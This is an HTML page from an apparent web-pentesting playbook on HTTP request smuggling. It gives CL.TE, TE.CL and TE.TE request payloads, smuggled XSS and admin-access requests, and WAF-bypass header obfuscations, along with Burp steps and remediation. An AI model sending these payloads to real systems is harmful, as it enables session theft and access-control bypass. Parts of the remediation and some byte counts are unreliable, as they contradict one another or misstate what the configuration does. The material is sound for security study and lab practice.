@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="HTTP request smuggling testing guide: CL.TE and TE.CL desync attacks, HTTP/2 downgrade smuggling, and cache poisoning via smuggling.">
+    <meta property="og:title" content="HTTP Request Smuggling – Web App Pentesting Guide">
+    <meta property="og:description" content="HTTP request smuggling testing guide: CL.TE and TE.CL desync attacks, HTTP/2 downgrade smuggling, and cache poisoning via smuggling.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>HTTP Request Smuggling  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">HTTP Request Smuggling</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <a href="#where-to-look">Where to Look</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#burp-workflow">Burp Workflow</a>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">🛡️ WAF Bypass</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <a href="#remediation">Remediation</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">See Also</a>
+  </nav>
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A03 · CVSS 9.8 · Day 4</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 21c.6.5 1.2 1 2.5 1 2.5 0 2.5-2 5-2 1.3 0 1.9.5 2.5 1s1.2 1 2.5 1c2.5 0 2.5-2 5-2 1.3 0 1.9.5 2.5 1"/><path d="M19.38 20A11.6 11.6 0 0 0 21 14l-9-4-9 4c0 2.9.94 5.34 2.81 7.76"/><path d="M19 13V7a2 2 0 0 0-2-2H7a2 2 0 0 0-2 2v6"/><path d="M12 10v4"/></svg></span><span>HTTP Request Smuggling</span></h1>
+      <p>HTTP Request Smuggling is a critical vulnerability where an attacker exploits disagreement between front-end and back-end servers about where one HTTP request ends and the next begins. By crafting a request with conflicting Content-Length and Transfer-Encoding headers, the attacker can "smuggle" a partial request into the queue, which gets prepended to the next legitimate user's request  · leading to request hijacking, cache poisoning, or account takeover.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">CRITICAL</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Expert</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">📖 The Customs Officers</div>
+        <p>Two customs officers inspect luggage in sequence. Officer 1 reads a label saying "3 bags" and checks them through. Officer 2 reads the same label but interprets it as "2 bags" and only processes the first two. The third bag gets labeled as belonging to the next passenger and gets smuggled through. HTTP Request Smuggling is similar: the front-end server (CDN, load balancer) and back-end server (application) disagree on how many requests were submitted. By exploiting this disagreement, the attacker smuggles a partial request that gets attached to the next user's request.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+      <div class="workflow-days">
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+        <div class="day-pill"><span class="day-num">Day 2</span>Auth/IDOR</div>
+        <div class="day-pill"><span class="day-num">Day 3</span>Enum</div>
+        <div class="day-pill deep"><span class="day-num">Day 4</span>If Multi-Tier</div>
+        <div class="day-pill"><span class="day-num">Day 5</span>Advanced</div>
+      </div>
+
+      <div class="callout method-probe">
+        <div class="callout-title">🎯 Day 1  · Confirm Multi-Tier Architecture</div>
+        <p>Request Smuggling only applies if there's a front-end and back-end server (CDN + origin, load balancer + app, reverse proxy + backend). During reconnaissance, check for these indicators: <code>X-Forwarded-For</code> or <code>X-Real-IP</code> in responses (indicates proxy layer), multiple server headers, response timing variations that suggest different backends. If it's a single-server app, request smuggling is not applicable.</p>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 4  · Request Smuggling Testing</div>
+        <p>On Day 4, only if you've confirmed a multi-tier architecture, test for request smuggling. Install the HTTP Request Smuggler Burp extension. Run the Smuggle Probe on target endpoints. If the probe confirms vulnerability (timing-based detection or observable smuggling), escalate to chained attacks like cache poisoning or session hijacking. This is complex and requires careful timing and validation.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>HTTP/1.1 allows two ways to specify the body length of a request:</p>
+      <ol class="steps">
+        <li><strong>Content-Length (CL):</strong> Specifies the exact number of bytes in the body. Example: <code>Content-Length: 13</code> means the body is exactly 13 bytes.</li>
+        <li><strong>Transfer-Encoding: chunked (TE):</strong> The body is divided into chunks. Each chunk is prefixed with its size in hex, followed by the chunk data. A zero-sized chunk signals the end of the body.</li>
+      </ol>
+      <p><strong>The vulnerability:</strong> If the front-end server prioritizes one header (e.g., CL) and the back-end prioritizes the other (e.g., TE), they disagree on where the request ends. The attacker crafts a request where the front-end thinks the body ends at byte X, but the back-end thinks it ends at byte Y. The difference is "smuggled" into the next request.</p>
+      <p><strong>Example  · CL.TE attack (front-end uses CL, back-end uses TE):</strong></p>
+      <pre><code>POST / HTTP/1.1
+Host: example.com
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+GET /admin HTTP/1.1
+Host: example.com
+
+0
+
+[Next legitimate user's request comes here]</code></pre>
+      <p>Front-end reads Content-Length: 49 and forwards the first 49 bytes. Back-end reads Transfer-Encoding: chunked and processes the "e" (hex 14, decimal 14 bytes), which is the GET /admin request. The GET /admin request gets smuggled and prepended to the next user's request, executing as if the next user made that request.</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>HTTP Request Smuggling is only relevant if:</p>
+      <ul>
+        <li><strong>Multi-tier architecture exists:</strong> CDN + origin server, load balancer + backend, reverse proxy + application. Single-server deployments are not vulnerable.</li>
+        <li><strong>Keep-alive connections are enabled:</strong> The vulnerability requires persistent connections so the smuggled request gets prepended to the next user's request. If keep-alive is disabled, each request gets a fresh connection and smuggling is not possible.</li>
+        <li><strong>HTTP/1.1 is used end-to-end:</strong> HTTP/2 doesn't support Transfer-Encoding: chunked, eliminating the attack class. If front-end uses HTTP/1.1 but back-end uses HTTP/2 (or vice versa), smuggling may still be possible but in different forms.</li>
+        <li><strong>Front-end and back-end disagree on request boundary:</strong> This is the core requirement. If both enforce the same standard, there's no disagreement and no smuggling.</li>
+      </ul>
+      <p><strong>Indicators of vulnerability:</strong> Response headers include <code>X-Forwarded-For</code>, response timing is inconsistent (suggests different backend servers), server header changes between requests, application doesn't reject Transfer-Encoding header.</p>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Install HTTP Request Smuggler extension.</strong> Go to Burp Extensions → BApp Store → search for "HTTP Request Smuggler" by albinowax. Install it. This extension automates request smuggling probes.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Confirm multi-tier architecture.</strong> Check response headers for <code>X-Forwarded-For</code>, <code>X-Real-IP</code>, or Via. If absent, request smuggling may not apply.
+          <pre><code>GET / HTTP/1.1
+...
+Response Headers:
+X-Forwarded-For: [client-ip]
+Via: 1.1 proxy-server</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Run Smuggle Probe.</strong> Right-click any request → Extensions → HTTP Request Smuggler → Smuggle Probe. The extension will test CL.TE, TE.CL, and TE.TE variants automatically.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Manual testing  · CL.TE probe.</strong> If Smuggle Probe doesn't detect, try manual testing. Send a CL.TE probe:
+          <pre><code>POST / HTTP/1.1
+Host: example.com
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: example.com
+</code></pre>
+          Disable automatic Content-Length update in Burp (Inspector → uncheck "Update Content-Length"). Send the request.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>Use timing-based detection.</strong> If the server is vulnerable to CL.TE, the back-end will wait for the "0" chunk to arrive, causing a timeout on the connection. If the request times out after ~10 seconds, CL.TE is likely vulnerable.
+          <pre><code>Timeout = likely CL.TE vulnerable
+Quick response = not CL.TE</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Use Turbo Intruder for reliable confirmation.</strong> Use Burp Intruder with "Pitchfork" mode and HTTP Request Smuggler gadget to rapidly send multiple requests and detect if smuggled requests appear in responses.
+          <pre><code>Send request 1 (smuggle): POST with CL.TE payload containing GET /admin
+Send request 2 (regular): GET /user
+Observe: If request 1 is smuggled, response to request 2 may include admin content</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">7</div>
+        <div>
+          <strong>Test TE.CL variant.</strong> If CL.TE fails, try TE.CL (front-end uses TE, back-end uses CL):
+          <pre><code>POST / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+GET /admin HTTP/1.1
+Host: example.com
+</code></pre>
+        </div>
+      </div>
+
+    </section>
+
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>CL.TE Probe (Front-end: CL, Back-end: TE)</h3>
+      <pre><code>POST / HTTP/1.1
+Host: example.com
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: example.com
+</code></pre>
+
+      <h3>TE.CL Probe (Front-end: TE, Back-end: CL)</h3>
+      <pre><code>POST / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+GET /admin HTTP/1.1
+Host: example.com
+</code></pre>
+
+      <h3>TE.TE with Obfuscated Header</h3>
+      <p>Both support TE, but one can be confused with header obfuscation:</p>
+      <pre><code>POST / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Transfer-Encoding: cow  (invalid, back-end may ignore first, use second)
+
+0
+
+GET /admin HTTP/1.1
+Host: example.com
+</code></pre>
+
+      <h3>Request Smuggling for XSS</h3>
+      <pre><code>POST / HTTP/1.1
+Host: example.com
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+GET /search?q="><script>alert(1)</script> HTTP/1.1
+Host: example.com
+Connection: close
+
+</code></pre>
+
+      <h3>Request Smuggling for Session Hijacking</h3>
+      <pre><code>POST / HTTP/1.1
+Host: example.com
+Content-Length: 47
+Transfer-Encoding: chunked
+
+0
+
+GET /profile HTTP/1.1
+Host: example.com
+
+</code></pre>
+
+      <h3>Request Smuggling to Bypass Access Controls</h3>
+      <pre><code>POST / HTTP/1.1
+Host: example.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/users HTTP/1.1
+Host: example.com
+
+</code></pre>
+
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          Progress: <span class="progress-mini">0/12</span>
+          <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check1">
+          <label for="check1">Confirm multi-tier architecture (check for X-Forwarded-For, Via headers)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check2">
+          <label for="check2">Verify HTTP/1.1 is used (not HTTP/2)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check3">
+          <label for="check3">Confirm keep-alive is enabled (Connection: keep-alive in responses)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check4">
+          <label for="check4">Install HTTP Request Smuggler extension in Burp</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check5">
+          <label for="check5">Run Smuggle Probe on target endpoints</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check6">
+          <label for="check6">Test CL.TE probe manually (disable Burp's Content-Length update)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check7">
+          <label for="check7">Test TE.CL probe manually</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check8">
+          <label for="check8">Perform timing-based detection (observe timeout behavior)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check9">
+          <label for="check9">Use Turbo Intruder to confirm smuggling via rapid request sequences</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check10">
+          <label for="check10">Test TE.TE with obfuscated Transfer-Encoding header</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check11">
+          <label for="check11">Attempt cache poisoning via request smuggling</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check12">
+          <label for="check12">Attempt session hijacking (capture next user's request)</label>
+        </div>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>TE.CL Variant</h3>
+      <p>WAF parses by Content-Length; backend parses by Transfer-Encoding. Send: <code>Transfer-Encoding: chunked</code> with a body that is a valid chunk sequence AND has a <code>Content-Length</code> that disagrees. The WAF sees one request; the backend sees two.</p>
+      <pre><code>POST / HTTP/1.1
+Host: example.com
+Transfer-Encoding: chunked
+Content-Length: 49
+
+0
+
+GET /admin HTTP/1.1
+Host: example.com</code></pre>
+
+      <h3>Obfuscating Transfer-Encoding</h3>
+      <p>Some servers accept malformed TE headers that WAFs normalise away:</p>
+      <pre><code>Transfer-Encoding: xchunked
+Transfer-Encoding : chunked  (space before colon)
+Transfer-Encoding: chunked, identity
+X: X\r\nTransfer-Encoding: chunked  (header injection)</code></pre>
+
+      <h3>HTTP/2 Downgrade (H2.CL / H2.TE)</h3>
+      <p>WAF speaks HTTP/2 to the frontend (no request smuggling possible in H2). Frontend downgrades to HTTP/1.1 to the backend. Inject a <code>Transfer-Encoding</code> or <code>Content-Length</code> in an HTTP/2 header field  · the downgrade carries it to HTTP/1.1 where smuggling applies.</p>
+
+      <h3>Chunk Size Obfuscation</h3>
+      <p>Valid hex chunk sizes accept leading zeros and uppercase: <code>0000000A</code> is valid for a 10-byte chunk. WAFs matching <code>\r\n0\r\n\r\n</code> as the terminal chunk miss <code>\r\n00\r\n\r\n</code>.</p>
+      <pre><code>0000000A
+Request smuggling payload
+00</code></pre>
+
+      <h3>Header Smuggling via CRLF</h3>
+      <p>Inject <code>\r\n</code> in a header value: <code>Foo: bar\r\nTransfer-Encoding: chunked</code>. RFC-compliant parsers reject this; some real-world servers accept it, allowing you to inject a second TE header the WAF never saw.</p>
+      <pre><code>Foo: bar\r\nTransfer-Encoding: chunked</code></pre>
+
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Bypass Access Controls</h3>
+      <p><strong>Impact: Critical.</strong> Smuggle a request for /admin or other restricted endpoint. The back-end processes it as if the front-end (which bypasses auth) sent it.</p>
+      <ul>
+        <li>Access admin panels.</li>
+        <li>Modify user permissions.</li>
+        <li>Escalate to full compromise.</li>
+      </ul>
+
+      <h3>Steal Other Users' Requests</h3>
+      <p><strong>Impact: Critical.</strong> Smuggle a request that causes the back-end to respond with the next legitimate user's request. This reveals the victim's request, including:</p>
+      <ul>
+        <li>Session cookies / tokens.</li>
+        <li>Private data in request bodies (passwords, PII).</li>
+        <li>Internal endpoints the victim accessed.</li>
+      </ul>
+
+      <h3>Cache Poisoning via Request Smuggling</h3>
+      <p><strong>Impact: High.</strong> Smuggle a request that poisons the cache. All subsequent users receive poisoned content.</p>
+
+      <h3>XSS via Request Smuggling</h3>
+      <p><strong>Impact: High.</strong> Smuggle a request containing XSS payload. If the response is cached, all users get XSS.</p>
+
+      <h3>Partial Request Replay</h3>
+      <p><strong>Impact: Medium-High.</strong> Capture part of the next user's request (headers, body) and replay it independently, potentially modifying it to cause unintended actions.</p>
+
+      <h3>Denial of Service</h3>
+      <p><strong>Impact: Medium.</strong> Continuously smuggle malformed requests that exhaust back-end resources or cause crashes.</p>
+
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Disable HTTP/1.1 Keep-Alive on Front-End</h3>
+      <p>Requires a fresh connection for each request, eliminating the ability to smuggle into the next user's request:</p>
+      <pre><code># Nginx
+http {
+  keepalive_timeout 0;
+}</code></pre>
+
+      <h3>2. Ensure Both Servers Use Same Body Length Standard</h3>
+      <p>Configure both front-end and back-end to prioritize the same header:</p>
+      <pre><code>Front-end (Nginx):
+proxy_pass http://backend;
+
+Back-end (Apache):
+LimitRequestFieldSize 8190  (enforce strict header parsing)</code></pre>
+
+      <h3>3. Upgrade to HTTP/2 End-to-End</h3>
+      <p>HTTP/2 doesn't support Transfer-Encoding: chunked, eliminating the attack vector. If upgrading the entire stack isn't possible, at least upgrade the front-end to HTTP/2.</p>
+
+      <h3>4. Don't Strip or Normalize TE Headers Between Servers</h3>
+      <p>Some proxies try to "normalize" requests by removing conflicting headers. Don't do this  · ensure servers communicate consistently:</p>
+      <pre><code>// Bad: proxy removes TE header
+if (request.headers['transfer-encoding']) {
+  delete request.headers['transfer-encoding'];
+}
+
+// Good: pass headers as-is
+proxy_pass http://backend;</code></pre>
+
+      <h3>5. Implement Request/Response Validation</h3>
+      <p>Validate that Content-Length and Transfer-Encoding are never both present in a single request:</p>
+      <pre><code>if (request.headers['content-length'] && request.headers['transfer-encoding']) {
+  reject_request('Both Content-Length and Transfer-Encoding present');
+}</code></pre>
+
+      <h3>6. Monitor for Smuggling Attempts</h3>
+      <p>Alert on requests with unusual header combinations:</p>
+      <ul>
+        <li>Both Content-Length and Transfer-Encoding headers.</li>
+        <li>Multiple Transfer-Encoding headers.</li>
+        <li>Conflicting body sizes between CL and TE.</li>
+        <li>Non-chunked Transfer-Encoding values.</li>
+      </ul>
+
+      <h3>7. Enforce Strict RFC 7230 Compliance</h3>
+      <p>Both front-end and back-end must strictly follow RFC 7230 HTTP/1.1 specification for header parsing and request boundary detection.</p>
+
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>Practice HTTP Request Smuggling on PortSwigger's free labs. These cover all attack variants and exploitation scenarios:</p>
+      <ul>
+        <li>HTTP request smuggling (CL.TE)</li>
+        <li>HTTP request smuggling (TE.CL)</li>
+        <li>HTTP request smuggling (TE.TE)</li>
+        <li>Exploiting HTTP request smuggling to bypass access controls</li>
+        <li>Exploiting HTTP request smuggling to reveal front-end request rewriting</li>
+        <li>Exploiting HTTP request smuggling to capture other users' requests</li>
+        <li>Exploiting HTTP request smuggling to deliver reflected XSS</li>
+        <li>HTTP request smuggling via conditional content-length header</li>
+        <li>HTTP request smuggling via ambiguous transfer-encoding header</li>
+        <li>HTTP request smuggling via character folding</li>
+        <li>Request smuggling using HTTP/2 downgrade</li>
+        <li>Response queue poisoning via HTTP request smuggling</li>
+        <li>HTTP/2 request smuggling via CRLF injection</li>
+        <li>HTTP/2 request smuggling via multiple content-length headers</li>
+        <li>Bypassing access controls via HTTP/2 tunnelling</li>
+        <li>Browser cache poisoning via HTTP/2 request smuggling</li>
+      </ul>
+      <p>Visit <code>portswigger.net/web-security/request-smuggling</code> to access the labs.</p>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">Testing Single-Server Apps</div>
+        <p><strong>Mistake:</strong> Attempting request smuggling on applications without a multi-tier architecture. <strong>Fix:</strong> Confirm multi-tier setup first by checking for X-Forwarded-For, Via, or other proxy headers. If the app is single-server, request smuggling doesn't apply.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Not Using HTTP Request Smuggler Extension</div>
+        <p><strong>Mistake:</strong> Manually crafting CL.TE/TE.CL payloads without understanding the exact byte counts. This is error-prone. <strong>Fix:</strong> Always use the HTTP Request Smuggler extension  · it automates the probe and handles byte calculations.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Forgetting to Disable Content-Length Update</div>
+        <p><strong>Mistake:</strong> Manually crafting a smuggling payload, but Burp automatically recalculates Content-Length, breaking the attack. <strong>Fix:</strong> In Burp Repeater, go to Inspector tab and uncheck "Update Content-Length" before sending.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Not Understanding Timing-Based Detection</div>
+        <p><strong>Mistake:</strong> Sending a probe and immediately assuming it's not vulnerable when there's no obvious error. <strong>Fix:</strong> CL.TE attacks often manifest as timeouts (server waiting for chunk end marker). Watch the response time  · if it's significantly delayed (5-10 seconds), the server may be CL.TE vulnerable.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Missing the Exploitation Step</div>
+        <p><strong>Mistake:</strong> Confirming request smuggling works but not escalating to actual exploitation. <strong>Fix:</strong> If smuggling is confirmed, escalate immediately: try to access /admin, capture the next user's request, or poison the cache. These are the high-impact exploitations.</p>
+      </div>
+
+    </section>
+
+    <section id="see-also">
+      <h2>See Also</h2>
+      <div class="see-also-grid">
+        <a href="cache-poisoning.html" class="see-also-card">
+          <h3>☠️ Cache Poisoning</h3>
+          <p>Request smuggling can be used to deliver cache poisoning attacks at scale.</p>
+        </a>
+        <a href="host-header.html" class="see-also-card">
+          <h3>🏷️ Host Header Injection</h3>
+          <p>Combination of host header injection with request smuggling can bypass multiple security layers.</p>
+        </a>
+        <a href="xss.html" class="see-also-card">
+          <h3>💉 XSS</h3>
+          <p>Request smuggling can deliver XSS payloads that affect other users.</p>
+        </a>
+        <a href="csrf.html" class="see-also-card">
+          <h3>⚔️ CSRF</h3>
+          <p>Captured requests via smuggling can be replayed as CSRF attacks.</p>
+        </a>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+const STORAGE_KEY = 'request-smuggling-checklist-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length/all.length*100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
